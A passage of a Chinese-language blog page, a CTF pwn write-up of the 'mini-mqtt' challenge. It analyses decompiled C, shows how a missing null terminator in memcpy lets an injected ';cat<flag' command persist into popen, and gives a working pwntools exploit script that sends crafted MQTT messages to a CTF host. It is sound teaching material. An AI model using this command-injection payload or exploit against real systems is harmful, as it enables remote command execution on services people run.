class="built_in">strlen</span>(src);</span><br><span class="line">        <span class="built_in">memcpy</span>(cmd, src, v7);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;index_html&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v5 )</span><br><span class="line">                stream = popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( stream )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span> ( fgets(v50, <span class="number">255</span>, stream) )</span><br><span class="line">                &#123;</span><br><span class="line">                    v50[<span class="built_in">strcspn</span>(v50, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( v50[<span class="number">0</span>] )</span><br><span class="line">                    &#123;</span><br><span class="line">                        msgsend(v50);</span><br><span class="line">                        <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pclose(stream);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                msgsend(<span class="string">&quot;403&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;fault2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;fault&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;404&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>http</code> 函数是整个程序的核心业务逻辑，也是正道题目真正的漏洞点所在。</p>
+<p>它的本意是接收一个类似 HTTP 的 GET 请求，解析出想要读取的文件名，安全检查后，通过系统命令 <code>cat</code> 读取该文件（实际上被硬编码限制为只能读取 <code>index_html</code>），并通过 MQTT 把文件内容发回去。</p>
+<h5 id="变量初始化与自发消息过滤"><a href="#变量初始化与自发消息过滤" class="headerlink" title="变量初始化与自发消息过滤"></a>变量初始化与自发消息过滤</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;&quot;</span>, s1) == <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;httpclient&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>与外部回调函数类似，防止处理自己发出的 JSON 心跳包，直接返回。</li>
+</ul>
+<h5 id="解析-HTTP-请求并提取文件名"><a href="#解析-HTTP-请求并提取文件名" class="headerlink" title="解析 HTTP 请求并提取文件名"></a>解析 HTTP 请求并提取文件名</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET /home/ctf/%63[^ \&quot;\r\n/]&quot;</span>, s) == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>功能</strong>：程序尝试用 4 种不同的正则表达式匹配收到的消息 <code>a1</code>。</li>
+<li><strong>目标</strong>：提取出 <code>GET</code> 请求路径中 <code>/ctf/</code> 后面的<strong>文件名</strong>，存放到变量 <code><strong>s</strong></code> 中。</li>
+<li>如果提取成功，标志位 <code>v5</code> 会被置为 <code>1</code>。</li>
+</ul>
+<h5 id="合法性校验"><a href="#合法性校验" class="headerlink" title="合法性校验"></a>合法性校验</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;GET %*s HTTP/1.1\r\nHost: %*s\r\nContentLength: %d\r\n&quot;</span>, &amp;v4) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; v4 ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 检查1：文件名长度不能大于 ContentLength</span></span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 检查2：ContentLength 不能大于 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[i] == <span class="string">&#x27;/&#x27;</span> || s[i] == <span class="string">&#x27;.&#x27;</span> ) s[i] = <span class="string">&#x27;_&#x27;</span>; <span class="comment">// 检查3：路径穿越防护</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>提取长度</strong>：寻找 HTTP 头里的 <code>ContentLength: %d</code>，把数字存入 <code>v4</code>。</li>
+<li><strong>长度限制</strong>：要求 <code>ContentLength</code> 必须 <strong>小于等于 10</strong>，且文件名的长度不能超过它。</li>
+<li><strong>字符过滤</strong>：把文件名 <code>s</code> 里的斜杠 <code>/</code> 和点 <code>.</code> 全部替换成下划线 <code>_</code>，防止攻击者用 <code>../../../etc/passwd</code> 这种路径穿越攻击。</li>
+</ul>
+<h5 id="构造系统命令"><a href="#构造系统命令" class="headerlink" title="构造系统命令"></a>构造系统命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(src, <span class="number">0x80u</span>, <span class="string">&quot;cat /home/ctf/%s&quot;</span>, s);</span><br><span class="line">v7 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(cmd, src, v7);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用 <code>snprintf</code> 拼接出完整的 Linux 读取命令，放到局部变量 src 里，例如：cat &#x2F;home&#x2F;ctf&#x2F;index_html</li>
+<li>拷贝到全局变量：计算 <code>src</code> 的长度 <code>v7</code>，然后使用 <code>memcpy</code> 将它拷贝到全局变量 <code>cmd</code> 中。</li>
+<li><code>strlen(src)</code>不包含字符串结尾的 <code>\0</code>（空字符）。<code>memcpy</code> 只拷贝了可见字符，没有把 <code>\0</code> 拷贝过去。如果 <code>cmd</code> 里面原本就有很长的数据，这次拷贝只会覆盖前半部分，后半部分依然残留！</li>
+</ul>
+<h5 id="执行命令并返回结果"><a href="#执行命令并返回结果" class="headerlink" title="执行命令并返回结果"></a>执行命令并返回结果</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;index_html&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 ) stream = popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( fgets(v50, <span class="number">255</span>, stream) ) <span class="comment">// 读取命令输出</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ... 发送给 MQTT 客户端 ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        pclose(stream);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>程序最后还强制要求提取出来的文件名 <code>s</code>必须完全等于 <code>&quot;index_html&quot;</code>。</li>
+<li>如果完全等于，就调用底层危险函数 <code>popen(cmd, &quot;r&quot;)</code> 执行全局变量 <code>cmd</code> 里的系统命令，把执行结果逐行通过 <code>msgsend</code> 传回去。</li>
+</ul>
+<h3 id="利用-EXP-进行-RCE："><a href="#利用-EXP-进行-RCE：" class="headerlink" title="利用 EXP 进行 RCE："></a>利用 EXP 进行 RCE：</h3><p>这道题进行了如下防护：只能叫 <code>index_html</code>，长度限制 &lt;&#x3D; 10，过滤了 <code>/</code> 和 <code>.</code>。</p>
+<p>首先利用<code>io.send(mqtt_publish(b&#39;HTTP&#39;, b&#39;GET /home/ctf/index_html;cat&lt;flag&#39;))</code></p>
+<ol>
+<li>提取出的文件名 <code>s</code> 是 <code>index_html;cat&lt;flag</code>。</li>
+<li>此时没有 <code>ContentLength</code>，<code>v5</code> 会变回 0，后面的 <code>popen</code> 绝对不会执行。</li>
+<li>但是程序依然执行了 <code>snprintf</code> 和 <code>memcpy</code>！</li>
+<li><code>src</code> 变成了：<code>cat /home/ctf/index_html;cat&lt;flag</code> （长度 32）。</li>
+<li>32 个字节被拷贝到了全局变量 <code>cmd</code> 中。此时 <code>cmd</code> &#x3D; <code>cat /home/ctf/index_html;cat&lt;flag</code>。</li>
+</ol>
+<hr>
+<p><code>io.send(mqtt_publish(b&#39;HTTP&#39;, b&#39;GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n&#39;))</code></p>
+<ol>
+<li>提取出的文件名 <code>s</code> 是合法的 <code>index_html</code>。</li>
+<li><code>ContentLength</code> 为 10，完全满足所有的苛刻检查。</li>
+<li><code>src</code> 拼接变成了合法的：<code>cat /home/ctf/index_html</code> （长度 24）。</li>
+<li><strong>当</strong><code>memcpy(cmd, src, 24)</code> 开始执行。它只覆盖了全局变量 <code>cmd</code> 的前 24 个字节！</li>
+<li>此时 <code>cmd</code> 的变化：<ul>
+<li>原本的 <code>cmd</code>：<code>cat /home/ctf/index_html;cat&lt;flag</code></li>
+<li>被覆盖 24 字节后：<code>cat /home/ctf/index_html;cat&lt;flag</code>，后面的恶意命令依旧存在</li>
+</ul>
+</li>
+<li>接下来检查：<code>if ( !strcmp(s, &quot;index_html&quot;) )</code>，因为此时的 <code>s</code> 确实是 <code>index_html</code>，检查通过</li>
+<li>执行 <code>popen(cmd, &quot;r&quot;)</code>。</li>
+<li>实际丢给系统的命令变成了：<code>cat /home/ctf/index_html;cat&lt;flag</code>。系统会先 cat 网页文件，然后执行恶意命令拿到 flag</li>
+</ol>
+<h3 id="总-EXP（remote）："><a href="#总-EXP（remote）：" class="headerlink" title="总 EXP（remote）："></a>总 EXP（remote）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class="line">port = <span class="number">27228</span></span><br><span class="line">io = remote(target, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_varint</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        byte = n &amp; <span class="number">0x7f</span></span><br><span class="line">        n &gt;&gt;= <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span>: byte |= <span class="number">0x80</span></span><br><span class="line">        res += <span class="built_in">bytes</span>([byte])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mqtt_connect</span>(<span class="params">client_id=<span class="string">b&quot;hacker&quot;</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;\x00\x04MQTT\x04\x02\x00\x3c&quot;</span> + struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(client_id)) + client_id</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;\x10&quot;</span> + encode_varint(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mqtt_publish</span>(<span class="params">topic, msg, retain=<span class="literal">True</span></span>):</span><br><span class="line">    flags = <span class="number">0x31</span> <span class="keyword">if</span> retain <span class="keyword">else</span> <span class="number">0x30</span></span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(topic)) + topic + msg</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([flags]) + encode_varint(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mqtt_subscribe</span>(<span class="params">topic, pkt_id=<span class="number">1</span></span>):</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, pkt_id) + struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(topic)) + topic + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;\x82&quot;</span> + encode_varint(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    io.send(mqtt_connect())</span><br><span class="line">    io.send(mqtt_subscribe(<span class="string">b&#x27;HTTP&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Payload </span></span><br><span class="line">    io.send(mqtt_publish(<span class="string">b&#x27;HTTP&#x27;</span>, <span class="string">b&#x27;GET /home/ctf/index_html;cat&lt;flag&#x27;</span>))</span><br><span class="line">    io.send(mqtt_publish(<span class="string">b&#x27;HTTP&#x27;</span>, <span class="string">b&#x27;GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    attack()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/xhzxKeoe6j9RO_yj/1779284661800-6107c775-b974-4cee-8b53-81d04b35c2e2-185074.png" alt="1779284661800-6107c775-b974-4cee-8b53-81d04b35c2e2.png"></p>
+<blockquote>
+<p>更新: 2026-05-21 00:44:41<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/pnyxh810a0egmtym">https://www.yuque.com/idcm/wnemg9/pnyxh810a0egmtym</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Kernel PWN" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/KernelPWN/index/" aria-label="前一篇: Kernel PWN" title="前一篇: Kernel PWN"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Kernel PWN
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="httpd" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/PolarisCTF_2026_WEBPWN/httpd/" aria-label="后一篇: httpd"  title="后一篇: httpd"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          httpd
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mini-mqtt"><span class="toc-number">1.</span> <span class="toc-text">mini-mqtt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-MQTT-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">创建 MQTT 客户端实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">设置回调函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E9%93%BE%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">配置链接参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E4%B8%BB%E5%BE%AA%E7%8E%AF"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">建立连接和主循环</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E4%B8%8E%E9%80%80%E5%87%BA"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">清理与退出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msgarrvd"><span class="toc-number">1.1.2.</span> <span class="toc-text">msgarrvd</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%BF%98%E5%8E%9F%E4%B8%8E%E7%90%86%E8%A7%A3"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">参数还原与理解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%B6%88%E6%81%AF%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">提取消息内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E8%BF%87%E6%BB%A4%EF%BC%88if-%E5%88%86%E6%94%AF%EF%BC%89"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">消息过滤（if 分支）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E5%85%B6%E4%BB%96%E6%B6%88%E6%81%AF%EF%BC%88else-%E5%88%86%E6%94%AF%EF%BC%89"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">处理其他消息（else 分支）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http"><span class="toc-number">1.1.3.</span> <span class="toc-text">http</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E8%87%AA%E5%8F%91%E6%B6%88%E6%81%AF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">变量初始化与自发消息过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-HTTP-%E8%AF%B7%E6%B1%82%E5%B9%B6%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">解析 HTTP 请求并提取文件名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E6%B3%95%E6%80%A7%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">合法性校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">构造系统命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%B9%B6%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">执行命令并返回结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-EXP-%E8%BF%9B%E8%A1%8C-RCE%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">利用 EXP 进行 RCE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%88remote%EF%BC%89%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP（remote）：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
